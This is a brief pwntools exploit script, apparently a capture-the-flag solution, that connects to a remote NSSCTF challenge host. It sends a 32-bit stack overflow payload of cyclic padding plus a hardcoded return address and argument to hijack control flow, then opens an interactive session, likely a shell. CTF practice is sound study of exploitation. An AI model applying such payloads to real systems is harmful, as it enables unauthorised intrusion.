from pwn import *
context(log_level='debug',arch='x86')

# io=process("./pwn")
io=remote("node1.anna.nssctf.cn",28017)
elf=ELF("./pwn")

io.recvuntil(b"!!!\n")
payload=cyclic(0x1c+0x4)+p32(0x80491E5)+p32(0x804C024)
io.send(payload)

io.interactive()